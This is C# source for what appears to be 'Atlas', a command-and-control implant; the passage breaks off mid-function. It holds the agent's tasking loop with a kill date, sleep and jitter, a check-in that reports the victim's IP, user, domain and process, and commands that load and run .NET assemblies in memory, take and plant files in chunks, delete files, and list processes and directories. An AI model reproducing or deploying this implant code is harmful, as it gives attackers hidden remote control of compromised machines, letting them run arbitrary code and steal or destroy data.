using System;
using System.Collections.Generic;
using System.Threading;
using System.Net;
using System.Text.RegularExpressions;
using System.Text;
using System.Linq;
using System.IO;

namespace Atlas
{
    public class Utils
    {
        public static void Loop(JobList JobList)
        {
            if (!CheckDate())
            {
                Environment.Exit(1);
            }
            Http.GetTasking(JobList);
            Dispatch(JobList);
            Http.PostResponse(JobList);
        }

        public static bool Dispatch (JobList JobList)
        {
            try
            {
                foreach (Job Job in JobList.jobs)
                {
                    if (!Job.job_started)
                    {
                        if (Job.command == "loadassembly")
                        {
                            if (Job.chunk_num == Job.total_chunks)
                            {
                                Thread thread = new Thread(() => ExecuteTasking(Job));
                                thread.Start();
                                Job.job_started = true;
                                Job.thread = thread;
                            }
                        }
                        else if (Job.command == "upload")
                        {
                            if (Job.chunks.Count == 0)
                            {
                                break;
                            }
                            else
                            {
                                Thread thread = new Thread(() => ExecuteTasking(Job));
                                thread.Start();
                                Job.thread = thread;
                            }
                        }
                        else if (Job.download)
                        {
                            if (Job.file_id == null)
                            {
                                if (!System.IO.File.Exists(Job.parameters))
                                {
                                    Job.response = "Error file does not exists";
                                    Job.completed = true;
                                    Job.success = false;
                                    Job.total_chunks = 0;
                                }
                                else
                                {
                                    Job.path = Modules.Download.GetPath(Job.parameters);
                                    Job.total_chunks = (int)Modules.Download.GetTotalChunks(Job.parameters);
                                    Job.file_size = Modules.Download.GetFileSize(Job.parameters);
                                    Job.completed = true;
                                    Job.success = true;
                                }
                            }
                            else if (Job.chunks.Count > 1)
                            {
                                break;
                            }
                            else
                            {
                                ExecuteTasking(Job);
                            }
                        }
                        else
                        {
                            Thread thread = new Thread(() => ExecuteTasking(Job));
                            thread.Start();
                            Job.job_started = true;
                            Job.thread = thread;
                        }
                    }
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static void ExecuteTasking(Job Job)
        {
            try
            {
                switch (Job.command.ToLower())
                {
                    case "loadassembly":
                        byte[] assembly = Modules.GetAssembly(Job.chunks, Job.total_chunks);
                        if (Modules.Load(Job.file_id, Convert.ToBase64String(assembly)))
                        {
                            Job.completed = true;
                            Job.response = "assembly successfully loaded";
                            Job.success = true;
                        }
                        else
                        {
                            Job.completed = true;
                            Job.response = "assembly could not be loaded";
                            Job.success = false;
                        }
                        break;
                    case "runassembly":
                        RunAssembly runAssembly = RunAssembly.FromJson(Job.parameters);
                        if (!Modules.Check(runAssembly.assembly_id))
                        {
                            Job.response = "assembly not loaded";
                            Job.completed = true;
                            Job.success = false;
                            break;
                        }
                        string[] args = new string[] { };
                        if (runAssembly.args.Length >= 2)
                        {
                            args = runAssembly.args.Split();
                        }
                        else
                        {
                            args = new string[] { runAssembly.args };
                        }
                        string response = Modules.Invoke(runAssembly.assembly_id, args);
                        if (response.Length < Config.ChunkSize)
                        {
                            Job.response = response;
                        }
                        else
                        {
                            Job.total_chunks = (response.Length + Config.ChunkSize - 1) / Config.ChunkSize;
                            int count = 0;
                            while (count != Job.total_chunks)
                            {
                                if (count + 1 == Job.total_chunks)
                                {
                                    int size = response.Length - (count * Config.ChunkSize);
                                    Job.chunks.Add(response.Substring((count * Config.ChunkSize), count));
                                    count++;
                                }
                                else
                                {
                                    Job.chunks.Add(response.Substring((count * Config.ChunkSize), Config.ChunkSize));
                                    count++;
                                }
                            }
                        }
                        Job.completed = true;
                        if (Job.response != "\r\n")
                        {
                            Job.success = true;
                        }
                        else
                        {
                            Job.success = false;
                        }
                        break;
                    case "listloaded":
                        if (!Config.Modules.Any())
                        {
                            Job.response = "no assemblies loaded";
                            Job.completed = true;
                            Job.success = false;
                            break;
                        }
                        string Assemblies = Modules.ListAssemblies();
                        Job.response = Assemblies;
                        Job.completed = true;
                        Job.success = true;
                        break;
                    case "download":
                        if (Job.chunk_num != Job.total_chunks)
                        {
                            string chunk = Modules.Download.GetChunk(Job.parameters, Job.chunk_num, Job.total_chunks, Job.file_size);
                            Job.chunks.Add(chunk);
                            Job.chunk_num++;
                        }
                        break;
                    case "upload":
                        if (Job.write_num == 0)
                        {
                            if (System.IO.File.Exists(Job.path))
                            {
                                Job.response = "Error file already exists";
                                Job.completed = true;
                                Job.success = false;
                            }
                        }
                        if (Job.chunks.Count != 0)
                        {
                            if(Modules.Upload(Job.path, Job.chunks[0]))
                            {
                                Job.write_num++;
                                Job.chunks.Remove(Job.chunks[0]);
                            }
                        }
                        if (Job.write_num == Job.total_chunks)
                        {
                            Job.response = "File successfully uploaded";
                            Job.completed = true;
                            Job.success = true;
                        }
                        break;
                    case "config":
                        if (Job.parameters.ToLower() == "info")
                        {
                            Job.response = Modules.GetConfig();
                            Job.completed = true;
                            Job.success = true;
                        }
                        else if(Modules.SetConfig(Job.parameters.ToLower()))
                        {
                            Job.response = "Configuration successfully updated";
                            Job.completed = true;
                            Job.success = true;
                        }
                        else
                        {
                            Job.response = "Error could not update config";
                            Job.completed = true;
                            Job.success = false;
                        }
                        break;
                    case "exit":
                        Environment.Exit(1);
                        break;
                    case "jobs":
                        break;
                    case "jobkill":
                        break;
                    case "pwd":
                        Job.response = Directory.GetCurrentDirectory();
                        Job.completed = true;
                        Job.success = true;
                        break;
                    case "cd":
                        if (Directory.Exists(Job.parameters))
                        {
                            Directory.SetCurrentDirectory(Job.parameters);
                            Job.response = "New current directory: " + Directory.GetCurrentDirectory();
                            Job.success = true;
                            Job.completed = true;
                        }
                        else
                        {
                            Job.response = "Could not find directory";
                            Job.success = false;
                            Job.completed = true;
                        }
                        break;
                    case "rm":
                        if (File.Exists(Job.parameters))
                        {
                            File.Delete(Job.parameters);
                            if (File.Exists(Job.parameters))
                            {
                                Job.response = "Could not delete file";
                                Job.success = false;
                                Job.completed = true;
                            }
                            else
                            {
                                Job.response = "Successfully deleted file";
                                Job.success = true;
                                Job.completed = true;
                            }
                        }
                        else
                        {
                            Job.response = "File does not exists";
                            Job.success = false;
                            Job.completed = true;
                        }
                        break;
                    case "ls":
                        if (Job.parameters == "")
                        {
                            Job.parameters = ".";
                        }
                        if (Directory.Exists(Job.parameters))
                        {
                            DirectoryList directoryList = Modules.DirectoryListing(Job.parameters);
                            Job.response = DirectoryList.ToJson(directoryList);
                            Job.success = true;
                            Job.completed = true;
                        }
                        else if (File.Exists(Job.parameters))
                        {
                            DirectoryList directoryList = Modules.DirectoryListing(Job.parameters);
                            Job.response = DirectoryList.ToJson(directoryList);
                            Job.success = true;
                            Job.completed = true;
                        }
                        else
                        {
                            Job.response = "Cannot find directory";
                            Job.success = false;
                            Job.completed = true;
                        }
                        break;
                    case "ps":
                        ProcessList processList = Modules.ProcessList.GetProcessList();
                        Job.response = ProcessList.ToJson(processList);
                        Job.success = true;
                        Job.completed = true;
                        break;
                    default:
                        Job.response = "Command not implemented";
                        Job.success = false;
                        Job.completed = true;
                        break;
                }
            }
            catch
            {

            }
        }

        public static bool RemoveJob(Job Job, JobList JobList)
        {
            try
            {
                if (Job.command == "download")
                {
                    JobList.jobs.Remove(Job);
                }
                else
                {
                    Job.thread.Abort();
                    JobList.jobs.Remove(Job);
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static bool CheckDate()
        {
            try
            {
                DateTime kill = DateTime.Parse(Config.KillDate);
                DateTime date = DateTime.Today;
                if (DateTime.Compare(kill, date) >= 0)
                {
                    return true;
                }

                else
                {
                    return false;
                }
            }
            catch
            {
                return true;
            }
        }

        public static int GetDwellTime()
        {
            double High = Config.Sleep + (Config.Sleep * (Config.Jitter * 0.01));
            double Low = Config.Sleep - (Config.Sleep * (Config.Jitter * 0.01));
            Random random = new Random();
            int Dwell = random.Next(Convert.ToInt32(Low), Convert.ToInt32(High));
            return Dwell * 1000;
        }

        public static string GetIPAddress()
        {
            IPHostEntry Host = default(IPHostEntry);
            string Hostname = null;
            Hostname = System.Environment.MachineName;
            Host = Dns.GetHostEntry(Hostname);
            string ip = "";
            foreach (IPAddress IP in Host.AddressList)
            {
                if (IP.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                {
                    ip = Convert.ToString(IP);
                }
            }
            return ip;
        }

        public static string GetArch()
        {
            string arch = "";
            if (IntPtr.Size == 8)
            {
                arch = "x64";
            }
            else
            {
                arch = "x86";
            }
            return arch;
        }

        public static string GetSessionId()
        {
            Random random = new Random();
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, 20).Select(s => s[random.Next(s.Length)]).ToArray());
        }

        // Stole from Covenant's Grunt
        // Adapted from https://github.com/mono/mono/blob/master/mcs/class/System.Web/System.Web/HttpUtility.cs
        public static string JavaScriptStringEncode(string value)
        {
            if (String.IsNullOrEmpty(value)) { return String.Empty; }
            int len = value.Length;
            bool needEncode = false;
            char c;
            for (int i = 0; i < len; i++)
            {
                c = value[i];
                if (c >= 0 && c <= 31 || c == 34 || c == 39 || c == 60 || c == 62 || c == 92)
                {
                    needEncode = true;
                    break;
                }
            }
            if (!needEncode) { return value; }

            var sb = new StringBuilder();
            for (int i = 0; i < len; i++)
            {
                c = value[i];
                if (c >= 0 && c <= 7 || c == 11 || c >= 14 && c <= 31 || c == 39 || c == 60 || c == 62)
                {
                    sb.AppendFormat("\\u{0:x4}", (int)c);
                }
                else
                {
                    switch ((int)c)
                    {
                        case 8:
                            sb.Append("\\b");
                            break;
                        case 9:
                            sb.Append("\\t");
                            break;
                        case 10:
                            sb.Append("\\n");
                            break;
                        case 12:
                            sb.Append("\\f");
                            break;
                        case 13:
                            sb.Append("\\r");
                            break;
                        case 34:
                            sb.Append("\\\"");
                            break;
                        case 92:
                            sb.Append("\\\\");
                            break;
                        default:
                            sb.Append(c);
                            break;
                    }
                }
            }
            return sb.ToString();
        }

        public static void GetServers()
        {
            foreach (string domain in Config.CallbackHosts)
            {
                Server server = new Server
                {
                    domain = domain,
                    count = 0
                };
                Config.Servers.Add(server);
            }
        }

        public class Server
        {
            public string domain { get; set; }
            public int count { get; set; }
        }

        public class CheckIn
        {
            public string action { get; set; }
            public string ip { get; set; }
            public string os { get; set; }
            public string user { get; set; }
            public string host { get; set; }
            public string domain { get; set; }
            public int pid { get; set; }
            public string uuid { get; set; }
            public string architecture { get; set; }

            public string JsonFormat = @"{{""action"":""{0}"",""ip"":""{1}"",""os"":""{2}"",""user"":""{3}"",""host"":""{4}"",""domain"":""{5}"",""pid"":{6},""uuid"":""{7}"",""architecture"":""{8}""}}";

            public static string ToJson(CheckIn checkin)
            {
                return String.Format(
                    checkin.JsonFormat,
                    JavaScriptStringEncode(checkin.action),
                    JavaScriptStringEncode(checkin.ip),
                    JavaScriptStringEncode(checkin.os),
                    JavaScriptStringEncode(checkin.user),
                    JavaScriptStringEncode(checkin.host),
                    JavaScriptStringEncode(checkin.domain),
                    JavaScriptStringEncode(checkin.pid.ToString()),
                    JavaScriptStringEncode(checkin.uuid),
                    JavaScriptStringEncode(checkin.architecture)
                );
            }
        }


        public class CheckInResponse
        {
            public string action { get; set; }
            public string id { get; set; }
            public string status { get; set; }

            public static string CheckInResponseFormat = @"{{""status"":""{0}"",""id"":""{1}"",""action"":""{2}""}}";

            public static List<string> Parse(string data, string format)
            {
                format = Regex.Escape(format).Replace("\\{", "{");
                if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
                if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
                if (format.Contains("{2}")) { format = format.Replace("{2}", "(?'group2'.*)"); }
                Match match = new Regex(format).Match(data);
                List<string> matches = new List<string>();
                if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
                if (match.Groups["group1"] != null) { matches.Add(match.Groups["group1"].Value); }
                if (match.Groups["group2"] != null) { matches.Add(match.Groups["group2"].Value); }
                return matches;
            }

            public static CheckInResponse FromJson(string message)
            {
                List<string> parseList = CheckInResponse.Parse(message, CheckInResponseFormat.Replace("{{", "{").Replace("}}", "}"));
                if (parseList.Count != 3) { return null; }
                return new CheckInResponse
                {
                    status = parseList[0],
                    id = parseList[1],
                    action = parseList[2]
                };
            }
        }

        public class GetTasking
        {
            public string action { get; set; }
            public int tasking_size { get; set; }

            public string JsonFormat = @"{{""action"":""{0}"",""tasking_size"":{1}}}";

            public static string ToJson(GetTasking get_tasking)
            {
                return String.Format(
                    get_tasking.JsonFormat,
                    JavaScriptStringEncode(get_tasking.action),
                    JavaScriptStringEncode(get_tasking.tasking_size.ToString())
                );
            }
        }

        public class GetTaskingResponse
        {
            public string action { get; set; }
            public List<Task> tasks { get; set; }

            public GetTaskingResponse()
            {
                tasks = new List<Task>();
            }

            public static string GetTaskingResponseFormat = @"{{""action"":""{0}"",""tasks"":{1}}}";

            public static List<string> Parse(string data, string format)
            {
                format = Regex.Escape(format).Replace("\\{", "{");
                if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
                if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
                Match match = new Regex(format).Match(data);
                List<string> matches = new List<string>();
                if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
                if (match.Groups["group1"] != null) { matches.Add(match.Groups["group1"].Value); }
                return matches;
            }

            public static GetTaskingResponse FromJson(string message)
            {
                List<string> parseList = GetTaskingResponse.Parse(message, GetTaskingResponseFormat.Replace("{{", "{").Replace("}}", "}"));
                if (parseList.Count != 2) { return null; }
                return new GetTaskingResponse
                {
                    action = parseList[0],
                    tasks = Task.ParseTasks(parseList[1])
                };
            }
        }

        public class PostResponse
        {
            public string action { get; set; }
            public List<TaskResponse> responses { get; set; }

            public PostResponse()
            {
                responses = new List<TaskResponse>();
            }

            public string JsonFormat = @"{{""action"":""{0}"",""responses"":[{1}]}}";

            public static string ToJson(PostResponse post_response)
            {
                string responses = "";
                int count = 0;
                foreach (TaskResponse task_response in post_response.responses)
                {
                    if ((count + 1) == post_response.responses.Count)
                    {
                        responses += TaskResponse.ToJson(task_response);
                    }
                    else
                    {
                        responses += TaskResponse.ToJson(task_response) + ',';
                    }
                    ++count;
                }
                return "{\"action\": \"" + post_response.action + "\", \"responses\": [" + responses + "]}";
            }
        }

        public class PostResponseResponse
        {
            public string action { get; set; }
            public List<Response> responses { get; set; }

            public PostResponseResponse()
            {
                responses = new List<Response>();
            }

            public static string PostResponseResponseFormat = @"{{""action"":""{0}"",""responses"":{1}}}";

            public static List<string> Parse(string data, string format)
            {
                format = Regex.Escape(format).Replace("\\{", "{");
                if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
                if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
                Match match = new Regex(format).Match(data);
                List<string> matches = new List<string>();
                if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
                if (match.Groups["group1"] != null) { matches.Add(match.Groups["group1"].Value); }
                return matches;
            }

            public static PostResponseResponse FromJson(string message)
            {
                List<string> parseList = PostResponseResponse.Parse(message, PostResponseResponseFormat.Replace("{{", "{").Replace("}}", "}"));
                if (parseList.Count != 2) { return null; }
                return new PostResponseResponse
                {
                    action = parseList[0],
                    responses = Response.ParseResponses(parseList[1])
                };
            }
        }

        public class Task 
        {
            public string command { get; set; }
            public string parameters { get; set; }
            public string id { get; set; }
            public string timestamp { get; set; }

            public static string TaskFormat = @"{{""command"":""{0}"",""parameters"":""{1}"",""id"":""{2}"",""timestamp"":{3}}}";

            public static List<string> Parse(string data, string format)
            {
                format = Regex.Escape(format).Replace("\\{", "{");
                if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
                if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
                if (format.Contains("{2}")) { format = format.Replace("{2}", "(?'group2'.*)"); }
                if (format.Contains("{3}")) { format = format.Replace("{3}", "(?'group3'.*)"); }
                Match match = new Regex(format).Match(data);
                List<string> matches = new List<string>();
                if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
                if (match.Groups["group1"] != null) { matches.Add(match.Groups["group1"].Value); }
                if (match.Groups["group2"] != null) { matches.Add(match.Groups["group2"].Value); }
                if (match.Groups["group3"] != null) { matches.Add(match.Groups["group3"].Value); }
                return matches;
            }

            public static List<Task> ParseTasks(string tasks_json)
            {
                if (tasks_json == "[]")
                {
                    return null;
                }
                else
                {
                    tasks_json = tasks_json.Replace("[", @"").Replace("]", @"");
                }
                List<Task> tasks = new List<Task>();
                string[] tasks_split = tasks_json.Split(new[] { "}," }, StringSplitOptions.RemoveEmptyEntries);
                int count = 0;
                foreach (string task in tasks_split)
                {
                    List<string> parseList = new List<string> { };
                    if (count + 1 != tasks_split.Length)
                    {
                        parseList = Task.Parse(task + "}", TaskFormat.Replace("{{", "{").Replace("}}", "}"));
                        if (parseList[0] == "")
                        {
                            string format = @"{{""command"":""{0}"",""parameters"":""{1}"",""id"":""{2}"",""timestamp"":{3}}}";
                            parseList = Task.Parse(task, format.Replace("{{", "{").Replace("}}", "}"));
                        }
                    }
                    else
                    {
                        parseList = Task.Parse(task + "}", TaskFormat.Replace("{{", "{").Replace("}}", "}"));
                        if (parseList[0] == "")
                        {
                            string format = @"{{""command"":""{0}"",""parameters"":""{1}"",""id"":""{2}"",""timestamp"":{3}}}";
                            parseList = Task.Parse(task, format.Replace("{{", "{").Replace("}}", "}"));
                        }
                    }
                    if (parseList.Count != 4) { return null; }
                    Task new_task = new Task
                    {
                        command = parseList[0],
                        parameters = parseList[1],
                        id = parseList[2],
                        timestamp = parseList[3]
                    };
                    tasks.Add(new_task);
                    ++count;
                }
                return tasks;
            }
        }

        public class TaskResponse
        {
            public string task_id { get; set; }
            public string user_output { get; set; }
            public string status { get; set; }
            public string completed { get; set; }
            public int? total_chunks { get; set; }
            public string full_path { get; set; }
            public int? chunk_num { get; set; }
            public string chunk_data { get; set; }
            public string file_id { get; set; }

            public string JsonFormat = @"{{""task_id"":""{0}"",""user_output"":""{1}"",""status"":""{2}"",""completed"":{3},""total_chunks"":{4},""full_path"":""{5}"",""chunk_num"":{6},""chunk_data"":""{7}"",""file_id"":""{8}""}}";
            public string JsonFormat1 = @"{{""task_id"":""{0}"",""user_output"":""{1}"",""status"":""{2}"",""completed"":""{3}"",""total_chunks"":""{4}"",""full_path"":""{5}"",""chunk_num"":{6},""chunk_data"":""{7}"",""file_id"":""{8}""}}";
            public string JsonFormat2 = @"{{""task_id"":""{0}"",""user_output"":""{1}"",""status"":""{2}"",""completed"":""{3}"",""total_chunks"":{4},""full_path"":""{5}"",""chunk_num"":""{6}"",""chunk_data"":""{7}"",""file_id"":""{8}""}}";
            public string JsonFormat3 = @"{{""task_id"":""{0}"",""user_output"":""{1}"",""status"":""{2}"",""completed"":""{3}"",""total_chunks"":""{4}"",""full_path"":""{5}"",""chunk_num"":""{6}"",""chunk_data"":""{7}"",""file_id"":""{8}""}}";

            public static string ToJson(TaskResponse task_response)
            {
                string Format = task_response.JsonFormat;
                if (task_response.user_output == null)
                {
                    task_response.user_output = "";
                }
                if (task_response.completed == null)
                {
                    task_response.completed = "";
                }
                if (task_response.status == null)
                {
                    task_response.status = "";
                }
                string total_chunks;
                if (task_response.total_chunks == null)
                {
                    Format = task_response.JsonFormat1;
                    total_chunks = "";
                }
                else
                {
                    Format = task_response.JsonFormat2;
                    total_chunks = task_response.total_chunks.ToString();
                }
                if (task_response.full_path == null)
                {
                    task_response.full_path = "";
                }
                string chunk_num;
                if (task_response.chunk_num == null)
                {
                    if (Format != task_response.JsonFormat2)
                    {
                        Format = task_response.JsonFormat3;
                    }
                    chunk_num = "";
                }
                else
                {
                    if (Format != task_response.JsonFormat2)
                    {
                        Format = task_response.JsonFormat1;
                    }
                    chunk_num = task_response.chunk_num.ToString();
                }
                if (task_response.chunk_data == null)
                {
                    task_response.chunk_data = "";
                }
                if (task_response.file_id == null)
                {
                    task_response.file_id = "";
                }
                return String.Format(
                Format,
                JavaScriptStringEncode(task_response.task_id),
                JavaScriptStringEncode(task_response.user_output),
                JavaScriptStringEncode(task_response.status),
                JavaScriptStringEncode(task_response.completed),
                JavaScriptStringEncode(total_chunks),
                JavaScriptStringEncode(task_response.full_path),
                JavaScriptStringEncode(chunk_num),
                JavaScriptStringEncode(task_response.chunk_data),
                JavaScriptStringEncode(task_response.file_id)
                );
            }
        }

        public class Response
        {
            public string task_id { get; set; }
            public string status { get; set; }
            public string error { get; set; }
            public string file_id { get; set;}

            public static string ResponseSuccessFormat = @"{{""status"":""{0}"",""task_id"":""{1}""}}";
            public static string ResponseErrorFormat = @"{{""status"":""{0}"",""task_id"":""{1}"",""error"":""{2}""}}";
            public static string ResponseDownloadFormat = @"{{""status"":""{0}"",""task_id"":""{1}"",""file_id"":""{2}""}}";

            public static List<string> ParseSuccess(string data, string format)
            {
                format = Regex.Escape(format).Replace("\\{", "{");
                if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
                if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
                Match match = new Regex(format).Match(data);
                List<string> matches = new List<string>();
                if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
                if (match.Groups["group1"] != null) { matches.Add(match.Groups["group1"].Value); }
                return matches;
            }

            public static List<string> ParseError(string data, string format)
            {
                format = Regex.Escape(format).Replace("\\{", "{");
                if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
                if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
                if (format.Contains("{2}")) { format = format.Replace("{2}", "(?'group2'.*)"); }
                Match match = new Regex(format).Match(data);
                List<string> matches = new List<string>();
                if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
                if (match.Groups["group1"] != null) { matches.Add(match.Groups["group1"].Value); }
                if (match.Groups["group2"] != null) { matches.Add(match.Groups["group2"].Value); }
                return matches;
            }

            public static List<Response> ParseResponses(string responses_json)
            {
                if (responses_json == "[]")
                {
                    return null;
                }
                else
                {
                    responses_json = responses_json.Replace("[", @"").Replace("]", @"");
                }
                List<Response> responses = new List<Response>();
                string[] responses_split = responses_json.Split(new[] { "}," }, StringSplitOptions.RemoveEmptyEntries);
                foreach (string response in responses_split)
                {
                    List<string> parseList = new List<string> { };
                    if (response.Contains("error"))
                    {
                        parseList = Response.ParseError(response, ResponseErrorFormat.Replace("{{", "{").Replace("}}", "}"));
                        if (parseList.Count != 3) { return null; }
                        Response new_response = new Response
                        {
                            status = parseList[0],
                            task_id = parseList[1],
                            error = parseList[2]
                        };
                        responses.Add(new_response);
                    }
                    else if (response.Contains("file_id"))
                    {
                        parseList = Response.ParseError(response, ResponseDownloadFormat.Replace("{{", "{").Replace("}}", "}"));
                        if (parseList.Count != 3) { return null; }
                        Response new_response = new Response
                        {
                            status = parseList[0],
                            task_id = parseList[1],
                            file_id = parseList[2]
                        };
                        responses.Add(new_response);
                    }
                    else
                    {
                        parseList = Response.ParseSuccess(response + "}", ResponseSuccessFormat.Replace("{{", "{").Replace("}}", "}"));
                        parseList.Add("");
                        if (parseList.Count != 3) { return null; }
                        Response new_response = new Response
                        {
                            status = parseList[0],
                            task_id = parseList[1],
                            error = parseList[2]
                        };
                        responses.Add(new_response);
                    }
                }
                return responses;
            }
        }

        public class JobList
        {
            public int job_count { get; set; }
            public List<Job> jobs { get; set; }

            public JobList()
            {
                jobs = new List<Job>();
            }
        }

        public class Job
        {
            public int job_id { get; set; }
            public string task_id { get; set; }
            public bool completed { get; set; }
            public bool job_started { get; set; }
            public bool success { get; set; }
            public string command { get; set; }
            public string parameters { get; set; }
            public string response { get; set; }
            public Thread thread { get; set; }
            public bool upload { get; set; }
            public bool download { get; set; }
            public bool chunking_started { get; set; }
            public int total_chunks { get; set; }
            public int chunk_num { get; set; }
            public int write_num { get; set; }
            public string file_id { get; set; }
            public long file_size { get; set; }
            public string path { get; set; }
            public List<string> chunks { get; set; }

            public Job()
            {
                chunks = new List<string>();
            }
        }

        public class UploadTasking
        {
            public string assembly_id { get; set; }
            public string remote_path { get; set; }

            public static string UploadTaskingFormat = @"""assembly_id"": ""{0}"", ""remote_path"": ""{1}""";

            public static List<string> Parse(string data, string format)
            {
                format = Regex.Escape(format).Replace("\\", @"");
                if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
                if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
                Match match = new Regex(format).Match(data.Replace(@"\", @""));
                List<string> matches = new List<string>();
                if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
                if (match.Groups["group1"] != null) { matches.Add(match.Groups["group1"].Value); }
                return matches;
            }

            public static UploadTasking FromJson(string message)
            {
                List<string> parseList = UploadTasking.Parse(message, UploadTaskingFormat);
                if (parseList.Count != 2) { return null; }
                return new UploadTasking
                {
                    assembly_id = parseList[0],
                    remote_path = parseList[1]
                };
            }
        }

        public class RunAssembly
        {
            public string args { get; set; }
            public string assembly_id { get; set; }

            public static string RunAssemblyFormat = @"""assembly_id"": ""{0}"", ""args"": ""{1}""";

            public static List<string> Parse(string data, string format)
            {
                format = Regex.Escape(format).Replace("\\", @"");
                if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
                if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
                Match match = new Regex(format).Match(data.Replace(@"\", @""));
                List<string> matches = new List<string>();
                if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
                if (match.Groups["group1"] != null) { matches.Add(match.Groups["group1"].Value); }
                return matches;
            }

            public static RunAssembly FromJson(string message)
            {
                List<string> parseList = RunAssembly.Parse(message, RunAssemblyFormat);
                if (parseList.Count != 2) { return null; }
                return new RunAssembly
                {
                    args = parseList[1],
                    assembly_id = parseList[0]
                };
            }
        }

        public class Upload
        {
            public string action { get; set; }
            public int chunk_size { get; set; }
            public string file_id { get; set; }
            public int chunk_num { get; set; }
            public string full_path { get; set; }
            public string task_id { get; set; }

            public string JsonFormat = @"{{""action"":""{0}"",""chunk_size"":{1},""file_id"":""{2}"",""chunk_num"":{3},""full_path"":""{4}"",""task_id"":""{5}""}}";

            public static string ToJson(Upload upload)
            {
                return String.Format(
                    upload.JsonFormat,
                    JavaScriptStringEncode(upload.action),
                    JavaScriptStringEncode(upload.chunk_size.ToString()),
                    JavaScriptStringEncode(upload.file_id),
                    JavaScriptStringEncode(upload.chunk_num.ToString()),
                    JavaScriptStringEncode(upload.full_path),
                    JavaScriptStringEncode(upload.task_id)
                );
            }
        }
        
        public class UploadResponse
        {
            public string action { get; set; }
            public int total_chunks { get; set; }
            public int chunk_num { get; set; }
            public string chunk_data { get; set; }
            public string file_id { get; set; }
            public string task_id { get; set; }

            public static string UploadResponseFormat = @"{{""action"":""{0}"",""total_chunks"":{1},""chunk_num"":{2},""chunk_data"":""{3}"",""file_id"":""{4}"",""task_id"":""{5}""}}";

            public static List<string> Parse(string data, string format)
            {
                format = Regex.Escape(format).Replace("\\{", @"{");
                if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
                if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
                if (format.Contains("{2}")) { format = format.Replace("{2}", "(?'group2'.*)"); }
                if (format.Contains("{3}")) { format = format.Replace("{3}", "(?'group3'.*)"); }
                if (format.Contains("{4}")) { format = format.Replace("{4}", "(?'group4'.*)"); }
                if (format.Contains("{5}")) { format = format.Replace("{5}", "(?'group5'.*)"); }
                Match match = new Regex(format).Match(data.Replace(@"\", @""));
                List<string> matches = new List<string>();
                if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
                if (match.Groups["group1"] != null) { matches.Add(match.Groups["group1"].Value); }
                if (match.Groups["group2"] != null) { matches.Add(match.Groups["group2"].Value); }
                if (match.Groups["group3"] != null) { matches.Add(match.Groups["group3"].Value); }
                if (match.Groups["group4"] != null) { matches.Add(match.Groups["group4"].Value); }
                if (match.Groups["group5"] != null) { matches.Add(match.Groups["group5"].Value); }
                return matches;
            }

            public static UploadResponse FromJson(string message)
            {
                List<string> parseList = UploadResponse.Parse(message, UploadResponseFormat.Replace("{{", "{").Replace("}}", "}"));
                if (parseList.Count != 6) { return null; }
                return new UploadResponse
                {
                    action = parseList[0],
                    total_chunks = Int32.Parse(parseList[1]),
                    chunk_num = Int32.Parse(parseList[2]),
                    chunk_data = parseList[3],
                    file_id = parseList[4],
                    task_id = parseList[5]
                };
            }
        }

        public class ProcessList
        {
            public List<Process> process_list { get; set; }
            public ProcessList()
            {
                process_list = new List<Process>();
            }

            public static string ToJson(ProcessList process_list)
            {
                string responses = "";
                int count = 0;
                foreach (Process process in process_list.process_list)
                {
                    if ((count + 1) == process_list.process_list.Count)
                    {
                        responses += Process.ToJson(process);
                    }
                    else
                    {
                        responses += Process.ToJson(process) + ',';
                    }
                    ++count;
                }
                return "[" + responses + "]";
            }
        }

        public class Process
        {
            public int process_id { get; set; }
            public string architecture { get; set; }
            public string name { get; set; }
            public string user { get; set; }
            public string bin_path { get; set; }
            public int parent_process_id { get; set; }

            public string ProcessFormat = @"{{""process_id"":{0},""architecture"":""{1}"",""name"":""{2}"",""user"":""{3}"",""bin_path"":""{4}"",""parent_process_id"":{5}}}";

            public static string ToJson(Process process)
            {
                return String.Format(
                    process.ProcessFormat,
                    JavaScriptStringEncode(process.process_id.ToString()),
                    JavaScriptStringEncode(process.architecture),
                    JavaScriptStringEncode(process.name),
                    JavaScriptStringEncode(process.user),
                    JavaScriptStringEncode(process.bin_path),
                    JavaScriptStringEncode(process.parent_process_id.ToString())
                );
            }
        }

        public class DirectoryList
        {
            public List<FileSystemEntry> directory_list { get; set; }
            public DirectoryList()
            {
                directory_list = new List<FileSystemEntry>();
            }

            public static string ToJson(DirectoryList directory_list)
            {
                string responses = "";
